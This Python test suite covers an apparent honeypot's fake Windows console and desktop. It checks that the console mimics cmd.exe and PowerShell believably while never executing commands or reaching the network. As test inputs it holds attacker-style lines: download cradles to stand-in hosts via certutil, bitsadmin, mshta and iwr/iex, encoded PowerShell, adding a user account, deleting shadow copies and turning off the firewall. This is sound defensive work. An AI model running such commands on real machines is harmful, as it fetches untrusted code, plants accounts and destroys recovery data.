"""The fake Windows command line and the desktop around it.

A visitor who reaches the console keeps typing only if it behaves like Windows, and what they
type is the intelligence. These tests pin the behaviours that make it believable (the exact
error wording, `dir` and `net user` layouts, a file they write being readable) and the ones that
keep it safe: nothing executes, nothing reaches the network, everything is bounded.
"""

import socket

import pytest

from honeypot_mcp.engines.rdp_desktop import MAX_INPUT_CHARS, Desktop, Screen
from honeypot_mcp.engines.rdp_font import GLYPHS, glyph
from honeypot_mcp.engines.rdp_shell import (
    MAX_FILES,
    MAX_OUTPUT_LINES,
    MAX_USERS,
    Identity,
    Shell,
    extract_urls,
    looks_like_download,
)

ID = Identity("WIN-ABC123", "CORP", "Administrator", peer_ip="203.0.113.9")


def shell(kind: str = "cmd") -> Shell:
    return Shell(ID, kind)


def out(s: Shell, line: str) -> str:
    return "\n".join(s.execute(line).lines)


# ── cmd.exe ──────────────────────────────────────────────────────────────────


def test_unknown_commands_use_windows_exact_wording():
    s = shell()
    assert s.execute("frobnicate now").lines == [
        "'frobnicate' is not recognized as an internal or external command,",
        "operable program or batch file.",
        "",
    ]


def test_identity_commands_agree_with_the_honeypot():
    s = shell()
    assert out(s, "whoami") == "corp\\administrator"
    assert out(s, "hostname") == "WIN-ABC123"
    assert "Version 10.0.17763" in out(s, "ver")
    assert "SeDebugPrivilege" in out(s, "whoami /priv") and "Administrators" in out(
        s, "whoami /groups"
    )
    assert out(s, "systeminfo").count("WIN-ABC123") >= 1
    assert s.prompt() == "C:\\Users\\Administrator>"


def test_two_visits_to_one_honeypot_agree_and_two_honeypots_differ():
    a, b = shell(), shell()
    other = Shell(Identity("WIN-ZZZ999", "CORP", "Administrator"))
    assert out(a, "ipconfig") == out(b, "ipconfig") != out(other, "ipconfig")
    assert out(a, "tasklist") == out(b, "tasklist")


def test_dir_matches_the_real_column_layout():
    lines = shell().execute("dir").lines
    assert lines[0] == " Volume in drive C has no label."
    assert any(ln.endswith("    <DIR>          Desktop") for ln in lines)
    assert lines[-1].endswith("bytes free") and "Dir(s)" in lines[-1]
    missing = out(shell(), "dir C:\\nope")
    assert "File Not Found" in missing


def test_cd_validates_and_tracks_the_directory():
    s = shell()
    assert out(s, "cd Desktop") == "" and s.prompt() == "C:\\Users\\Administrator\\Desktop>"
    assert out(s, "cd ..") == "" and out(s, "cd \\") == "" and s.prompt() == "C:\\>"
    assert out(s, "cd nowhere") == "The system cannot find the path specified."
    assert out(s, "d:") == "The system cannot find the path specified." or s.prompt()
    assert out(s, "cd C:\\Windows\\System32") == "" and s.prompt().endswith("System32>")
    assert out(s, "cd") == "C:\\Windows\\System32"


def test_a_file_the_visitor_writes_can_be_read_back_and_listed():
    """A visitor who writes a file and cannot find it leaves at once."""
    s = shell()
    s.execute("cd Desktop")
    assert s.execute("echo hello > note.txt").lines == []
    s.execute("echo more >> note.txt")
    assert out(s, "type note.txt") == "hello \nmore "  # cmd keeps the space before `>>`
    listing = out(s, "dir")
    assert "note.txt" in listing and "2 File(s)" in listing
    assert s.execute("del note.txt").lines == []
    assert out(s, "type note.txt") == "The system cannot find the file specified."


def test_writes_are_bounded_and_protected_paths_refuse():
    s = shell()
    for n in range(MAX_FILES + 5):
        s.execute(f"echo x > f{n}.txt")
    assert out(s, "echo x > overflow.txt") == "There is not enough space on the disk."
    assert out(s, "echo x > C:\\Windows\\System32\\evil.dll") == "Access is denied."
    assert out(s, "echo x > C:\\nope\\a.txt") == "The system cannot find the path specified."
    s2 = shell()
    for _ in range(5):
        s2.execute("echo " + "A" * 900 + " >> big.txt")
    assert len(s2.fs.created["C:\\Users\\Administrator\\big.txt"]) == 2048
    assert (
        out(s2, "del C:\\Windows\\win.ini") == "Access is denied."
    )  # shipped files are not deletable


def test_net_user_add_is_visible_afterwards_and_bounded():
    s = shell()
    assert "hax" not in out(s, "net user")
    assert out(s, "net user hax Passw0rd1 /add") == "The command completed successfully.\n"
    assert "hax" in out(s, "net user")
    assert "Account active" in out(s, "net user hax")
    assert "could not be found" in out(s, "net user ghost")
    for n in range(MAX_USERS + 5):
        s.execute(f"net user u{n} pw /add")
    assert len(s.users) <= MAX_USERS
    assert "Administrator" in out(s, "net localgroup administrators")


def test_protected_processes_refuse_to_die_and_others_can():
    s = shell()
    assert "Access is denied" in out(s, "taskkill /f /im MsMpEng.exe")
    assert "Access is denied" in out(s, "taskkill /pid 652")  # lsass
    assert out(s, "taskkill /im cmd.exe").startswith("SUCCESS")
    assert "not found" in out(s, "taskkill /im nothing.exe")


def test_nothing_reaches_the_network():
    """No socket is ever opened by any command, however it is phrased."""
    real = socket.socket

    class Forbidden(real):  # type: ignore[misc, valid-type]
        def __init__(self, *a, **k):
            raise AssertionError("the shell opened a socket")

    socket.socket = Forbidden  # type: ignore[misc, assignment]
    try:
        s = shell()
        for cmd in ("ping 8.8.8.8", "ping google.com", "nslookup example.com", "tracert 10.0.0.1",
                    "curl http://203.0.113.5/x", "certutil -urlcache -f http://a.example/x y",
                    "bitsadmin /transfer j http://a.example/x C:\\x", "powershell iwr http://a.example/x",
                    "powershell -c (New-Object Net.WebClient).DownloadString('http://a.example/p')"):  # fmt: skip
            s.execute(cmd)
    finally:
        socket.socket = real  # type: ignore[misc]


def test_there_is_no_route_out_and_every_tool_agrees():
    s = shell()
    assert "Request timed out" in out(s, "ping 8.8.8.8") and "100% loss" in out(s, "ping 8.8.8.8")
    assert "could not find host" in out(s, "ping google.com")
    assert out(s, "curl http://evil.example/a") == "curl: (6) Could not resolve host: evil.example"
    assert "port 80" in out(s, "curl http://203.0.113.5/a") and "Timed out" in out(
        s, "curl http://203.0.113.5/a"
    )
    assert "ERROR_WINHTTP_NAME_NOT_RESOLVED" in out(
        s, "certutil -urlcache -f http://evil.example/a a"
    )
    assert "0x80072ee7" in out(s, "bitsadmin /transfer j http://evil.example/a C:\\a")


def test_urls_in_a_command_are_extracted_for_the_event():
    assert extract_urls("curl http://a.example/x?y=1 -o a & wget https://b.example/z") == [
        "http://a.example/x?y=1", "https://b.example/z",
    ]  # fmt: skip
    assert looks_like_download("iex (iwr http://a/b)") and looks_like_download(
        "certutil -urlcache x"
    )
    assert not looks_like_download("dir C:\\Users")


def test_exit_and_cls_and_echo():
    s = shell()
    assert s.execute("cls").clear and s.execute("exit").exit
    assert out(s, "echo hello world") == "hello world" and out(s, "echo") == "ECHO is on."


def test_every_output_is_bounded():
    s = shell()
    for cmd in ("help", "tasklist", "systeminfo", "set", "net user", "echo " + "z" * 5000):
        r = s.execute(cmd)
        assert len(r.lines) <= MAX_OUTPUT_LINES and all(len(ln) <= 240 for ln in r.lines)
    assert s.execute(" " * 3000 + "x").lines  # overlong input is truncated, not an error


def test_quiet_real_commands_do_not_pretend_to_be_missing():
    """`attrib`, `mode`, `chkdsk`... exist on Windows: 'not recognized' would be the tell."""
    s = shell()
    for cmd in ("attrib", "mode con", "wevtutil qe System", "gpupdate /force", "tree"):
        assert "not recognized" not in out(s, cmd)


# ── PowerShell ───────────────────────────────────────────────────────────────


def test_powershell_switches_prompt_and_back():
    s = shell()
    assert "Windows PowerShell" in out(s, "powershell")
    assert s.prompt() == "PS C:\\Users\\Administrator> "
    assert s.execute("exit").exit is False and s.kind == "cmd"


def test_powershell_commands_and_errors():
    s = shell("powershell")
    assert "Mode                LastWriteTime" in out(s, "Get-ChildItem")
    assert out(s, "pwd").splitlines()[-1] == "C:\\Users\\Administrator"
    assert "ProcessName" in out(s, "Get-Process") and "PSVersion" in out(s, "$PSVersionTable")
    error = out(s, "Get-Nothing")
    assert (
        "is not recognized as the name of a cmdlet" in error and "CommandNotFoundException" in error
    )
    assert "Unable to connect to the remote server" in out(s, "iwr http://203.0.113.5/p")
    assert "could not be resolved" in out(s, "Invoke-WebRequest http://evil.example/p")


def test_powershell_dash_command_runs_without_changing_the_session():
    s = shell()
    assert out(s, "powershell -c whoami") == "corp\\administrator" and s.kind == "cmd"
    assert "could not be resolved" in out(s, "powershell -nop -c iwr http://evil.example/p")


# ── font ─────────────────────────────────────────────────────────────────────


def test_the_font_covers_printable_ascii_and_falls_back_to_a_visible_box():
    assert all(len(glyph(chr(c))) == 16 for c in range(32, 127))
    assert glyph("é") == glyph("\u2591") and glyph("A") != glyph("B") and set(glyph(" ")) == {0}
    assert len(GLYPHS) >= 95


# ── desktop ──────────────────────────────────────────────────────────────────


def desktop(width=1024, height=768, bpp=16) -> Desktop:
    d = Desktop(width, height, bpp, ID)
    d.commit()
    return d


def type_(d: Desktop, text: str, now: float = 0.0):
    return d.apply([("char", c) for c in text], now)


def open_terminal(d: Desktop) -> None:
    d.apply([("click", 30, 120, 1)], 1.0)
    d.apply([("click", 30, 120, 1)], 1.3)


def test_nothing_happens_until_the_visitor_does_something():
    d = desktop()
    assert (
        d.apply([("char", "x"), ("click", 500, 300, 1)]) is None
    )  # nothing open: typing goes nowhere
    assert d.terminal is None


def test_a_double_click_on_the_icon_opens_the_console_and_one_click_does_not():
    d = desktop()
    assert d.apply([("click", 30, 120, 1)], 1.0) is not None and d.terminal is None  # selected only
    d.apply([("click", 30, 120, 1)], 5.0)
    assert d.terminal is None  # the second click came too late to be a double-click
    d.apply([("click", 30, 120, 1)], 5.4)
    assert d.terminal is not None
    assert d.shell is not None and d.shell.kind == "cmd"


def test_only_the_left_button_acts():
    d = desktop()
    d.apply([("click", 30, 120, 2)], 1.0)
    d.apply([("click", 30, 120, 2)], 1.2)
    assert d.terminal is None


def test_typing_in_the_console_runs_commands_and_records_them():
    d = desktop()
    open_terminal(d)
    type_(d, "whoami\n")
    assert [(c.shell, c.text) for c in d.drain_commands()] == [("cmd", "whoami")]
    assert d.drain_commands() == [] and d.commands_run == 1
    assert any("corp\\administrator" in line for line in d._scrollback)
    type_(d, "powershell\nGet-Date\n")
    assert [(c.shell, c.text) for c in d.commands[-2:]] == [
        ("cmd", "powershell"),
        ("powershell", "Get-Date"),
    ]


def test_backspace_edits_the_line_and_empty_lines_are_not_commands():
    d = desktop()
    open_terminal(d)
    d.apply([("char", c) for c in "whoamix"] + [("char", "\b"), ("char", "\n")])
    assert [c.text for c in d.commands] == ["whoami"]
    type_(d, "\n\n  \n")
    assert len(d.commands) == 1


def test_a_keystroke_costs_a_thin_strip_not_the_screen():
    d = desktop()
    open_terminal(d)
    rect = type_(d, "d")
    assert rect is not None
    x0, y0, x1, y1 = rect
    assert (y1 - y0) <= 16 and (x1 - x0) <= 64
    assert sum(len(c[4]) for c in d.chunks(rect)) < 2000


def test_update_chunks_are_small_and_cover_the_rectangle_bottom_up():
    d = desktop()
    open_terminal(d)
    rect = (0, 0, d.width, d.height)
    chunks = d.chunks(rect)
    assert all(len(data) <= 16_000 for *_, data in chunks)
    assert sum((y1 - y0) for _x0, y0, _x1, y1, _ in chunks) == d.height
    x0, y0, x1, y1, data = chunks[0]
    assert len(data) == (x1 - x0) * (y1 - y0) * 2
    top_row = bytes(d._frame[y0][: (x1 - x0) * 2])
    bottom_up_last = data[-(x1 - x0) * 2 :]
    assert bottom_up_last == top_row  # the last row sent is the topmost


def test_the_start_menu_the_run_dialog_and_escape():
    d = desktop()
    d.apply([("special", "win")])
    assert d.start_open
    d.apply([("special", "esc")])
    assert not d.start_open
    d.apply([("click", 20, d.height - 10, 1)])  # the Start button
    assert d.start_open
    x0, y0, x1, y1 = d._menu_rect()
    d.apply([("click", 40, y0 + 4 + 14, 1)])  # first item: Command Prompt
    assert d.terminal is not None and not d.start_open
    d.apply([("special", "win+r")])
    assert d.run is not None
    type_(d, "powershell\n")
    assert d.run is None and d.shell is not None and d.shell.kind == "powershell"
    assert d.commands[-1].shell == "run" and d.commands[-1].text == "powershell"


def test_run_dialog_records_what_was_typed_and_reports_unknown_programs_like_windows():
    d = desktop()
    d.apply([("special", "win+r")])
    type_(d, "totally-fake\n")
    assert d.message is not None and "Windows cannot find 'totally-fake'" in d.message.lines[0]
    d.apply([("char", "\n")])
    assert d.message is None
    d.apply([("special", "win+r")])
    type_(d, "cmd /c whoami & powershell -enc AAAA\n")
    assert d.terminal is None  # arguments: nothing opens; but it is recorded
    assert [c.text for c in d.commands] == ["totally-fake", "cmd /c whoami & powershell -enc AAAA"]
    d.apply([("special", "win+r")])
    type_(d, "notepad\n")
    assert d.message is None  # a real program: no error, just no window to show


def test_the_close_button_and_exit_close_the_console():
    d = desktop()
    open_terminal(d)
    assert d.terminal is not None
    t = d.terminal
    d.apply([("click", t.x + t.w - 20, t.y + 10, 1)])
    assert d.terminal is None
    open_terminal(d)
    type_(d, "exit\n")
    assert d.terminal is None


def test_scrollback_and_input_are_bounded():
    d = desktop()
    open_terminal(d)
    type_(d, "x" * (MAX_INPUT_CHARS + 300))
    assert len(d._input) == MAX_INPUT_CHARS
    d._input = ""
    for _ in range(40):
        type_(d, "help\n")
    assert len(d._scrollback) <= 300


def test_a_small_screen_still_gets_a_usable_console():
    d = desktop(320, 240)
    open_terminal(d)
    assert d.terminal is not None
    t = d.terminal
    assert t.x >= 0 and t.y >= 0 and t.x + t.w <= 320 and t.y + t.h <= 240 - 40 + 8
    type_(d, "whoami\n")  # does not raise


@pytest.mark.parametrize("bpp", [15, 16, 24, 32])
def test_every_colour_depth_renders(bpp):
    d = Desktop(640, 480, bpp, ID)
    assert d.commit() == (0, 0, 640, 480)
    open_terminal(d)
    type_(d, "dir\n")
    assert all(len(r) == 640 * ((bpp + 7) // 8) for r in d._frame)


def test_text_is_clipped_to_the_screen_not_wrapped_around_or_raised():
    s = Screen(64, 32, 16)
    s.text(-20, 0, "ABCDEFGH", (255, 255, 255), (0, 0, 0))
    s.text(40, 0, "ABCDEFGH", (255, 255, 255), (0, 0, 0))
    s.text(0, 30, "A", (255, 255, 255), (0, 0, 0))  # does not fit vertically
    s.text(0, -3, "A", (255, 255, 255), (0, 0, 0))
    assert all(len(r) == 128 for r in s.rows)


def test_a_hostile_stream_of_actions_neither_raises_nor_grows_state_without_bound():
    import random

    rng = random.Random(7)
    d = desktop(1024, 768)
    keys = ["\n", "\b", "\t", "\x00", "é", "x", "'", '"', ">", "&", "|", "%", " ", "\u202e"]
    for _ in range(4000):
        kind = rng.random()
        if kind < 0.5:
            d.apply([("char", rng.choice(keys))])
        elif kind < 0.8:
            d.apply(
                [
                    (
                        "click",
                        rng.randrange(-50, 1100),
                        rng.randrange(-50, 800),
                        rng.choice([1, 1, 2, 3]),
                    )
                ],
                rng.random() * 3,
            )
        else:
            d.apply([("special", rng.choice(["esc", "win", "win+r", "bogus"]))])
    assert len(d._scrollback) <= 300 and len(d.commands) <= 100
    assert d.shell is None or len(d.shell.fs.created) <= 20


# ── second review: fidelity ─────────────────────────────────────────────────


def test_cmd_works_inside_the_console_and_nests():
    """The console is cmd.exe: it must know `cmd`, which is the first thing run to launch
    anything with /c."""
    s = shell()
    assert out(s, "cmd /c whoami") == "corp\\administrator"
    assert out(s, 'cmd /c "echo hi"') == "hi"
    assert s.execute("cmd /c exit").exit is False  # the child ended, not this window
    assert "Microsoft Windows [Version" in out(s, "cmd")
    assert s.execute("exit").exit is False  # back to the outer cmd
    assert s.execute("exit").exit is True


@pytest.mark.parametrize(
    ("typed", "expected"),
    [
        ("cd..", "C:\\Users>"),
        ("cd\\", "C:\\>"),
        ("cd /d C:\\Windows", "C:\\Windows>"),
    ],
)
def test_commands_run_together_with_their_arguments_like_in_cmd_exe(typed, expected):
    s = shell()
    assert "not recognized" not in out(s, typed)
    assert s.prompt() == expected
    assert "IPv4 Address" in out(s, "ipconfig/all") and "Directory of" in out(s, "dir/w")
    assert out(s, "echo.") == "" and out(s, "echo.hello") == "hello"
    assert "not recognized" not in out(s, "type\\")  # `type` of nothing, not an unknown command


def test_quoted_paths_with_spaces_work_everywhere():
    s = shell()
    assert "Directory of C:\\Program Files" in out(s, 'dir "C:\\Program Files"')
    assert "Common Files" in out(s, 'dir /a "C:\\Program Files (x86)"')
    s.execute('mkdir "my dir"')
    s.execute('echo x > "my dir\\a b.txt"')
    assert "a b.txt" in out(s, 'dir "my dir"')
    assert out(s, 'del "my dir\\a b.txt"') == ""


def test_powershell_command_lines_are_parsed_like_powershell_does():
    """`powershell -nop -w hidden -c "..."` is the standard cradle: the flag VALUES were run as
    the command (`hidden : The remote name could not be resolved`)."""
    s = shell()
    cradle = s.execute('powershell -nop -w hidden -c "iwr http://x.example/y"')
    assert (
        "could not be resolved: 'x.example'" in "\n".join(cradle.lines)
        and "hidden" not in cradle.lines[0]
    )
    assert (
        out(s, 'powershell -NoProfile -ExecutionPolicy Bypass -Command "whoami"')
        == "corp\\administrator"
    )
    assert (
        s.execute("powershell -ExecutionPolicy Bypass -File a.ps1").lines == []
    )  # runs something unseen
    assert s.execute("powershell -enc SQBFAFgA").lines == []
    assert out(s, "powershell whoami") == "corp\\administrator"  # bare command text works too


def test_a_word_that_merely_mentions_a_downloader_is_not_a_download():
    """`echo curl` printed `unable to resolve` and, worse, raised the alert to CRITICAL
    (exempt from notification throttling) each time."""
    s = shell()
    for line in (
        "echo curl",
        "echo http://example.com/a.txt",
        "dir C:\\wget",
        "net user irm /add",
        "type iwr.txt",
    ):
        assert not looks_like_download(line), line
    assert (
        out(s, "echo curl") == "curl"
        and out(s, "echo http://example.com/a.txt") == "http://example.com/a.txt"
    )
    for line in ("curl http://a.example/x", "mshta http://a.example/x.hta", "powershell -c iwr http://a",
                 "iex (New-Object Net.WebClient).DownloadString('http://a/b')", "certutil -urlcache -f http://a b"):  # fmt: skip
        assert looks_like_download(line), line


def test_the_console_agrees_with_the_windows_build_the_honeypot_reports():
    """The NLA exchange and nmap report one of three builds; the console claimed Server 2019
    whatever it was."""
    from honeypot_mcp.engines.rdp_nla import _BUILDS

    names = {14393: "Server 2016", 17763: "Server 2019", 20348: "Server 2022"}
    for build in {b[2] for b in _BUILDS}:
        s = Shell(Identity("WIN-X", "CORP", "Administrator", (10, 0, build)))
        info = out(s, "systeminfo")
        assert names[build] in info and f"Build {build}" in info
        assert f"10.0.{build}" in out(s, "ver") and f"5.1.{build}." in out(
            shell_ps(build), "$PSVersionTable"
        )
        assert names[build] in out(s, "wmic os get caption")
    assert "(c) Microsoft Corporation." in "\n".join(
        Shell(Identity("W", "C", "A", (10, 0, 20348))).banner()
    )


def shell_ps(build: int) -> Shell:
    return Shell(Identity("WIN-X", "CORP", "Administrator", (10, 0, build)), "powershell")


def test_exit_leaves_powershell_when_it_was_opened_directly():
    direct = Shell(ID, "powershell")
    assert direct.execute("exit").exit is True  # a PowerShell window simply closes
    nested = shell()
    nested.execute("powershell")
    assert nested.execute("exit").exit is False and nested.kind == "cmd"
    assert nested.execute("powershell -c exit").exit is False


def test_files_behave_like_windows_files():
    s = shell()
    s.execute("echo a > FOO")
    s.execute("echo b >> foo")
    assert (
        out(s, "type foo") == "a \nb "
        and out(s, "dir").count("foo") + out(s, "dir").count("FOO") == 1
    )
    assert s.execute("echo x > .").lines == ["Access is denied."]
    assert s.execute("echo x > C:\\").lines == ["Access is denied."]
    assert s.execute("echo x > ..").lines == ["Access is denied."]
    before = dict(s.fs.created)
    assert s.execute("echo x > nul").lines == [] and s.fs.created == before  # a device, not a file
    s.execute("echo y > trail.txt.")
    assert "trail.txt" in out(s, "dir") and "trail.txt." not in out(s, "dir")
    assert s.execute("echo x > Users").lines == []  # `Users` is not a directory here: a file
    assert s.execute("echo x > C:\\Users").lines == ["Access is denied."]  # but this one is


def test_rmdir_ren_move_and_assoc_exist():
    s = shell()
    s.execute("mkdir work")
    s.execute("echo data > work\\a.txt")
    assert out(s, "ren work\\a.txt b.txt") == "" and "b.txt" in out(s, "dir work")
    assert "1 file(s) moved" in out(s, "move work\\b.txt c.txt") and "c.txt" in out(s, "dir")
    assert out(s, "rmdir /s /q work") == ""
    assert "File Not Found" in out(s, "dir work")  # gone, along with the file inside it
    assert out(s, "rmdir C:\\Windows") == "Access is denied."
    assert out(s, "ren nothing.txt x.txt") == "The system cannot find the file specified."
    assert out(s, "assoc .txt") == ".txt=txtfile" and "not found" in out(s, "assoc .nope")


def test_ending_the_session_from_the_console():
    for line in ("shutdown /r /t 0", "shutdown /s", "logoff", "shutdown /l"):
        assert shell().execute(line).disconnect is True, line
    assert "no shutdown was in progress" in out(shell(), "shutdown /a")
    for word in (
        "bcdedit /set x y",
        "vssadmin delete shadows /all /quiet",
        "netsh advfirewall set allprofiles state off",
    ):
        assert "not recognized" not in out(shell(), word)
    assert out(shell(), "netsh advfirewall set allprofiles state off").startswith("Ok.")


def test_the_machine_answers_for_itself_and_nothing_else():
    s = shell()
    assert "Reply from ::1" in out(s, "ping localhost") and "0% loss" in out(s, "ping localhost")
    assert "Reply from 127.0.0.1" in out(s, "ping 127.0.0.1")
    assert "Reply from 10." in out(s, "ping WIN-ABC123")
    assert "100% loss" in out(s, "ping 10.9.9.9") and "could not find host" in out(
        s, "ping example.com"
    )


def test_a_username_of_only_dots_is_not_an_account():
    from honeypot_mcp.engines.rdp_session import _safe_user

    assert _safe_user("..") == "Administrator" and _safe_user(".") == "Administrator"
    assert _safe_user("CORP\\svc.backup") == "svc.backup" and _safe_user("a b") == "Administrator"


# ── second review: the desktop ──────────────────────────────────────────────


def test_unknown_characters_share_one_glyph_and_one_cache_entry():
    """The cache was keyed by the character, but every character the font lacks draws the same
    block, so a visitor typing 85,000 distinct ones grew it without bound (121 MB measured)."""
    d = desktop(1024, 768, 32)
    open_terminal(d)
    for start in range(0x4E00, 0x4E00 + 3000, 100):
        d.apply([("char", chr(c)) for c in range(start, start + 100)] + [("char", "\n")])
    assert len(d.screen._glyphs) < 500


def test_a_message_box_is_modal():
    d = desktop()
    d.apply([("click", 30, 30, 1)], 1.0)
    d.apply([("click", 30, 30, 1)], 1.3)  # Recycle Bin: a message
    assert d.message is not None
    d.apply([("special", "win+r")])
    assert d.run is None  # Run waits behind it
    d.apply([("special", "win")])
    assert not d.start_open
    d.apply([("char", "\n")])
    assert d.message is None
    d.apply([("special", "win+r")])
    assert d.run is not None


def test_dialogs_fit_the_screen_and_wrap_their_text():
    for width, height in ((320, 240), (400, 300), (1020, 764)):
        d = desktop(width, height)
        d.apply([("special", "win+r")])
        r = d.run
        assert (
            r is not None and r.x >= 0 and r.x + r.w <= width and r.y >= 0 and r.y + r.h <= height
        )
        assert all(len(line) * 8 <= r.w - 16 for line in r.lines)
        type_(d, "no-such-program-at-all-xyz\n")
        m = d.message
        assert m is not None and m.x >= 0 and m.x + m.w <= width
        assert all(len(line) * 8 <= m.w - 24 for line in m.lines)


def test_ctrl_c_abandons_the_line_and_logoff_ends_the_session():
    d = desktop()
    open_terminal(d)
    type_(d, "echo secret")
    d.apply([("special", "ctrl+c")])
    assert d._input == "" and any(ln.endswith("echo secret^C") for ln in d._scrollback)
    assert d.disconnect is False
    type_(d, "shutdown /r /t 0\n")
    assert d.disconnect is True
    d2 = desktop()
    d2.apply([("special", "win+r")])
    type_(d2, "logoff\n")
    assert d2.disconnect is True
